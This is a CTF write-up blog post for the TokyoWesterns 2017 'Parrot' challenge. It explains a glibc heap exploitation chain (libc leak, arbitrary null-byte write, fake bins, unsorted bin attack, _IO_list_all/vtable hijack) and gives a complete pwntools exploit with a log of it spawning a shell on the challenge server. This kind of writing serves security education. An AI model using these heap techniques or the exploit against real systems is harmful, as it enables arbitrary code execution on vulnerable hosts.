---
layout: post
title: TokyoWesterns 2017 - Parrot
category: [Exploitation]
tags: [Exploitation, TokyoWesterns]
comments: true
---

**Points:** 267
**Solves:** 9
**Category:** Exploitation
**Description:** 

> Solved by [kileak](https://kileak.github.io/) & uafio

> [tw2017parrot]({{site.url}}/assets/tw2017parrot)


## Main

{% highlight C %}
int main(void) {
  long size;
  char* buf;
  setvbuf(stdin, (char*)NULL, _IONBF, 0);
  setvbuf(stdout, (char*)NULL, _IONBF, 0);
  sleep(3);
  while ( 1 )
  {
    puts("Size:");
    scanf("%lu", &size);
    getchar();
    if ( !size )
      break;
    buf = malloc(size);
    puts("Buffer:");
    read(0, buf, size);
    buf[size - 1] = 0;
    write(1, buf, size);
    free(buf);
  }
  exit(0);
}
{% endhighlight %}

Wow... while writing this I had to pause here for a while. I didn't realize the challenge I've been pwning all day is only this small! This is awesome! Where do you even begin...

Truth is [Kileak](https://kileak.github.io/) had already done half of the work and I just wanted to document our method just because of the sheer amount of exploitation methods involved.

## Summary

In short, we begin with getting an info leak by creating a bunch of different sized fastbin chunks (fastbin chunk <= 0x80 bytes with the metadata) followed by a request for a chunk of at least MIN_LARGE_SIZE+1 (0x400 bytes). By doing so we force the fastbin chunks to coalesce and eventually provide us with a leak. Then we create a new mmaped segment for our heap along with it's new main_arena, we do this by requesting an enormous sized chunk.

By abusing the `long size;` as a pointer and `char* buf` as an index (always 0) we can write a NULL byte anywhere. In this case we overwrite the 2nd byte of new main_arena->top_ptr. Since the new main_arena and the new heap are on the same segment this will point the top_ptr right over the smallbins.

After we have gained control of the smallbins we create 2 fake buffers using the smallbins. First with size of a fastbin that will get put into it's fastbin index. Second of size smallbin so when it gets freed right away it will get put into the unsorted bin. After that we use the fastbin to overwrite the unsorted bin's BK ptr and perform a unsorted bin attack (needless to say the address of the fastbin and unsorted bin need to overlap).

With unsorted bin attack we can attack the _IO_list_all and the vtable of the _IO_FILE stderr just as in [House of Orange](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html).

## Info leak

With the application running in a loop with `malloc()` followed by `free()` first it seems like impossible to get an info leak. But by abusing 2 facts we can achieve our goal. 
1. We take advantage of that fastbin sized chunks don't merge with the top chunk but instead they are being put into their appropriate fastbin.
2. An allocation bigger than MIN_LARGE_SIZE (0x3ff bytes on 64bit system) skips the allocation for fastbins and smallbins and does a check if fastbins exist in the current main_arena, consolidate them to avoid heap fragmentation.

{% highlight C %}
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))    
    {
        ...                     // <-- fastbins 0x80
    }

  if (in_smallbin_range (nb))
    {
        ...                     // <-- smallbins 0x400
    }

  /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else
    {
      idx = largebin_index (nb);
      if (have_fastchunks (av))
        malloc_consolidate (av);
    }
{% endhighlight %}

## New heap

Next, we create a new heap by requesting a huge chunk that would fail even mmap. Requesting a chunk bigger than the current top chunk and no free list can satisfy, malloc will call upon `sysmalloc` for extending the current heap. `Sysmalloc` will do a check if the request is bigger or equal than `mp_.mmap_threshold` (0x20000 bytes on my 64bit machine) `sysmalloc` will then call `mmap`. But if the size is too big even for mmap, the mmap will fail and brk syscall will be tried, and if this fails, `_int_malloc` will return 0. Then `__libc_malloc` will call `arena_get_retry` which it will call `arena_get2` to fetch another arena (av) in it's arena list. However since no arena's but main_arena are currently present, `arena_get2` will create a new arena with `_int_new_arena => new_heap` so `__libc_malloc` can try the allocation again with `_int_malloc` and the newly created arena. This of course will fail but it will result 2 things we are interested in.
- A new arena will be used for any sequential allocations.
- The mstate (main_arena structure) for the new heap and the new heap itself will share the same segment (how convenient) ! At the segment's base there will be a pointer to the mstate (which is usually just 0x20 bytes away from the segment's base) followed by the new heap (meaning new_heap->top points right after the mstate).

## Vulnerability

Going back to the source now let's exploit `buf[size - 1] = 0;`. How ? By requesting a size to match a target address which will result in the `long size` used as a `char *` and `malloc` returning `0` for `buf` as our index. This will write 0 at arbitrary address (in the new heap, the new heap because we can't use the old heap anymore since it will not be used after the first time we use this vulnerability).

## Exploitation

What is our write NULL byte target ? Well, thanks to Kileak's ingenious thinking, we can overwrite the 2nd byte of the `new arena->top` which will cause the top chunk to point right over the smallbins of the mstate of the new arena (remember they share the same segment now). 

After that, we can create a fake smallbin which points right on top of the mstate's smallbins (almost on top of itself) so we can control all the metadata of it, but it's actual size is of fastbin ! So after it's allocated it will be freed and put into the fastbins. This way we create a fastbin for later allocations, which is very important because fastbin allocations are the fastest and will not mess with the mstate or any of the other bins.

#### Creating a fake smallbin

Let's start with the `struct malloc_state *mstate` structure.

When malloc keep track of chunks in the malloc state, malloc only handles the actual base of chunks it deals with, not the user returned buffer, and the sizes are always the actual full size of the chunk including the metadata. For example let's see the unsorted bin. The chunk starts at `0x7fa17c000078` with it's FD and BK pointers both pointing to it. And the numbers on the side are the size of the chunks being linked in that index. So, requesting a chunk of 0x100 bytes malloc will change the size to include metadata making it 0x110. The index for 0x110 is at `0x7fa17c000188 and 0x7fa17c000190`, `0x7fa17c000188` being the address of it's FD ptr and `0x7fa17c000190` being the address for it's BK ptr. To check if a free chunk is present at that index malloc takes the BK ptr and checks if its not equal to the base address of that index's base smallbin `0x7fa17c000178`.

{% highlight C %}
#define last(b)      ((b)->bk)       // bin in this case is 0x7fa17c000178
if ((victim = last (bin)) != bin)    // for index of size 0x110 bytes
...
{% endhighlight %}

![malloc_state]({{site.url}}/assets/malloc_state.png)

As you can see we have already corrupted everything... the 2nd byte of the top chunk to make it point to the smallbins. We have also made our fake smallbin chunk for size 0x110 (user request 0x100). The chunk's BK pointer at `0x7fa17c000190` making the `victim 0x7fa17c0001b0`. The only check that prevents malloc from returning `0x7fa17c0001c0 (user buffer)` is that `0x7fa17c0001b0->BK->FD != 0x7fa17c0001b0`.

{% highlight C %}
bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)) {
        errstr = "malloc(): smallbin double linked list corrupted";
        goto errout;
    }
{% endhighlight %}

As you can see we have satisfied all conditions for the a requested 0x100 bytes to return `0x7fa17c0001c0` as our fake smallbin chunk. It's size is `0xc0` which is going to place it in the unsorted bin as soon as it gets freed after the allocation.

### Creating a fake fastbin

We will do the same fake chunk but user request of size `0xf0` bytes. Looking at the corrupted data from the screenshot, can you tell what's going to be the user returned buffer for that size ?

Answer is 
{% highlight python %}
hex(((1986105027929944064 * 1607285210432060) & 0xffffffffffffffff) / 12652153316952724 + 2305983340760531296 - 2305843009213693952 % 2305843009213825028)
{% endhighlight %}

This chunk will be placed in the fastbins when freed because its size is of largest fastbin.

If you notice we have also set the `PREV_IN_USE` bit for both of our fake chunks so when freed there won't be any backward consolidations. The forward consolidations are also taken care of thanks to all the array of `0x21` longs.

## Unsorted bin attack

We are at a state with two free chunks, one in the fastbins and one in the unsorted bins. Our goal is to corrupt the unsorted bin's BK pointer so when an allocation is made the address of the unsorted bin will be written at the now corrupted `BK + 0x10`. In our exploit we already corrupted the unsorted bin's BK ptr via the buffer of the fake fastbin. When we allocated the fastbin, the chunk's buffer overlays right on top of the fake unsorted bin so we could easily just overwrite the BK ptr. As you have probably figured out, the second fake chunk was of fastbin size so when freed it won't interfere with our chunk in the unsorted bin.

Here is the state of the heap after corruption (sorry for the different addresses, had to restart).

![malloc_state_2]({{site.url}}/assets/malloc_state_2.png)

We have `0x7fc4fc0001b0` in the unsorted bin and `0x7fc503f5b510` in `unsorted bin->BK`. We have also modified the unsorted bin's size to `0x90` so it can match exactly a request of `0x80` bytes. And we have also put `0x7fc4fc0000f8` address at `0x7fc4fc000110` so when requesting `0x80` it will not try to return a smallbin chunk but use the unsorted bin instead.

What is `0x7fc503f5b510` address you ask? It's `&_IO_list_all-0x10` which will cause the address of the address of the unsorted bin `0x7fc4fc000078` to be written exactly at `_IO_list_all` which currently holds a pointer to the `stderr _IO_FILE` structure.

Let's go ahead and verify the conditions for this write.

First off is the check if there is a chunk in the unsorted bin. Verifying if `unsorted chunk->BK != unsorted chunk` basically saying `0x7fc4fc0001b0 != 0x7fc4fc000078` from the screenshot above and also setting victim to `0x7fc4fc0001b0`.

{% highlight C %}
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
{
    bck = victim->bk;
    ...
{% endhighlight %}

Next we need to skip the if branch for using the `last_remainder`.

{% highlight C %}
if (in_smallbin_range (nb) &&        // if requested size 0x90 < 0x3ff
    bck == unsorted_chunks (av) &&   // if 0x7fc4fc0001b0->BK == 0x7fc4fc000078
    victim == av->last_remainder &&  // if 0x7fc4fc0001b0 == 0
    (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) // if 0x90 > 0x90+0x20
    {...
{% endhighlight %}

We know that the second check fails... Now we can proceed and exploit the unsorted bin attack.

{% highlight C %}
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;   // Make 0x7fc503f5b510 the new unsorted bin
bck->fd = unsorted_chunks (av);   // mov [0x7fc503f5b510+0x10], 0x7fc4fc000078

/* Take now instead of binning if exact fit */

if (size == nb)     // our size is exact match
{
    set_inuse_bit_at_offset (victim, size);
    if (av != &main_arena)
        victim->size |= NON_MAIN_ARENA;     // set bit 4
    check_malloced_chunk (av, victim, nb);
    void *p = chunk2mem (victim);   // return user buffer
    alloc_perturb (p, bytes);
    return p;
}
{% endhighlight %}

## [House of Orange?](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)

We are successfully out of malloc with our write objective completed. However a crash happens in `_int_free` right away because of the BK we corrupted.

{% highlight C %}
/*
Place the chunk in unsorted chunk list. Chunks are
not placed into regular bins until after they have
been given one chance to be used in malloc.
*/
bck = unsorted_chunks(av);
fwd = bck->fd;
if (__glibc_unlikely (fwd->bk != bck))  // if 0x7fc4fc0001b0->FD != 0x7fc4fc000078
{
    errstr = "free(): corrupted unsorted chunks";
    goto errout;
}
{% endhighlight %}

But as described in the [House of Orange](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html) we can still get a shell out of a crash. After all this is the reason we corrupted _IO_list_all.

To figure out how exactly, we will have to trace the call stack. When malloc/free fails with an error it will call on `malloc_printerr => __libc_message => abort => fflush / _IO_flush_all_lockp => _IO_OVERFLOW (if requirements are satisfied)`

{% highlight C %}
// file libio/genops.c function _IO_flush_all_lockp (int do_lock)
fp = (_IO_FILE *) _IO_list_all;  // our pointer
while (fp != NULL)
{
...
// Edited version of the checks for better readability
if (
(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
 ||
(fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
      
      _IO_OVERFLOW (fp, EOF))
...
fp = fp->_chain;
}  

{% endhighlight %}

Our goal is to reach the `_IO_OVERFLOW` which is a call to a pointer from the `fp->_IO_jump_t->__overflow`. You decide which OR condition you can satisfy.

Here are the important offsets

{% highlight text %}
fp->_mode                   : 0xc0
fp->_IO_write_base          : 0x20
fp->_IO_write_ptr           : 0x28
fp->_chain                  : 0x68
fp->_wide_data              : 0xa0
_wide_data->_IO_write_base  : 0x18
_wide_data->_IO_write_ptr   : 0x20
fp->vtable                  : 0xd8
IO_jump_t->__overflow       : 0x18
{% endhighlight %}

## Extras

Some interesting _IO_FILE related structures.

{% highlight C %}
// libioP.h
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

// libio.h
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

// libio.h
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};

// libio.h
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;   /* Start of putback+get area. */
  wchar_t *_IO_write_base;  /* Start of put area. */
  wchar_t *_IO_write_ptr;   /* Current put pointer. */
  wchar_t *_IO_write_end;   /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;     /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

{% endhighlight %}

## Full exploit

{% highlight python %}
#!/usr/bin/python

from pwn import *
import sys

def alloc(size, data, sendn = True):
    r.sendline(size)
    r.recvuntil("Buffer:\n")
    if sendn:
        r.sendline(data)
    else:
        r.send(data)
    return r.recvline()

def exploit(r):
    r.recvuntil("Size:\n")

    log.info("Leaking libc addresses")

    alloc("0"*0x700+"160", "E")
    alloc("10", "A")
    alloc("40", "B")
    alloc("80", "C")
    alloc("100", "D")
    alloc("2048", "")
    
    LIBCLEAK = u64(r.recvline()[7:7+8])
    MAINARENA = LIBCLEAK - 88
    LIBC = LIBCLEAK - 0x3c3b78

    log.info("LIBC leak       : %s" % hex(LIBCLEAK))
    log.info("LIBC            : %s" % hex(LIBC))
    log.info("MAIN ARENA      : %s" % hex(MAINARENA))
    log.info("Moving main arena to mmaped area")

    alloc(str((MAINARENA + 96 + 8 - 8)), "")
    log.info("Leaking next main arena")

    alloc("10", "A")
    alloc("40", "B")
    alloc("80", "C")
    alloc("100", "D")
    alloc("2048", "")

    NEXTARENA = u64(r.recvline()[7:7+8]) - 0x78

    log.info("NEXT ARENA      : %s" % hex(NEXTARENA))
    log.info("Prepare memory area below next arena with fake chunk sizes")

    payload = flat("A"*32, p64(0),
                    p64(0x25), p64(0), p64(0x25),
                    "B"*208, p64(0), p64(0x25),
                    "B"*2712)

    alloc("3000", payload, False)

    log.info("Overwrite one byte of next arena top")
    alloc(str((NEXTARENA+0x7a)), "")
    
    log.info("Allocate chunk inside next main arena")

    payload = flat( p64(NEXTARENA+0x60), p64(0)*3,
                    p64(NEXTARENA+0x298), p64(0)*5,
                    p64(NEXTARENA+0xf8), p64(0),
                    p64(0)*7, p64(0x81),
                    p64(NEXTARENA+0x150), p64(NEXTARENA+0x150),
                    p64(0), p64(0),
                    p64(NEXTARENA+0x150), p64(0),
                    p64(NEXTARENA+0x1b0), p64(0),
                    p64(0x414141), p64(0x424242),
                    p64(0), p64(0xc1),
                    p64(0x41414141), p64(NEXTARENA+0x1c0),
                    p64(NEXTARENA+0x1b0), p64(NEXTARENA+0x180),
                    p64(0), p64(0x21)*22,
                    '/bin/sh\x00',
                    p64(0x31)*11, p64(0)*8,
                    p64(NEXTARENA+0x368), p64(0)*3,
                    p64(1), p64(0),
                    p64(0), p64(NEXTARENA+0x390),
                    p64(1), p64(2),
                    p64(3), p64(0),
                    p64(0)*2,
                    p64(LIBC+0x45390 - 0x1000),
#                   p64(LIBC+0xf1117 - 0x1000)  <-- this also works one_gadget
                    )

    payload = payload.ljust(0x840, 'A')
    alloc(str((0x840)), payload, False)
    pause()
    alloc(str(0x100), '')

    payload = flat( p64(0) * 11, p64(0x92),
                    p64(0), p64(LIBC + 0x3c4510))
    alloc(str(0xf0), payload)
    alloc(str(128), '')

    r.interactive()

    
if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./parrot'], env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)

{% endhighlight %}

{% highlight text %}
➜  parrot python ./parrot.py pwn2.chal.ctf.westerns.tokyo 31337
[*] For remote: ./parrot.py HOST PORT
[+] Opening connection to pwn2.chal.ctf.westerns.tokyo on port 31337: Done
[*] Leaking libc addresses
[*] LIBC leak       : 0x7f5581799b78
[*] LIBC            : 0x7f55813d6000
[*] MAIN ARENA      : 0x7f5581799b20
[*] Moving main arena to mmaped area
[*] Leaking next main arena
[*] NEXT ARENA      : 0x7f557c000000
[*] Prepare memory area below next arena with fake chunk sizes
[*] Overwrite one byte of next arena top
[*] Allocate chunk inside next main arena
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ ls
flag
launch.sh
parrot
$ cat flag
TWCTF{0verwr1t3_w1th_z3r0_1s_p0w3rfu11!}
$
{% endhighlight %}

> P.S. I'm actually not sure what to call House of Orange. Is it the abuse of _int_free in sysmalloc or is it the abuse of the _IO_list_all. 
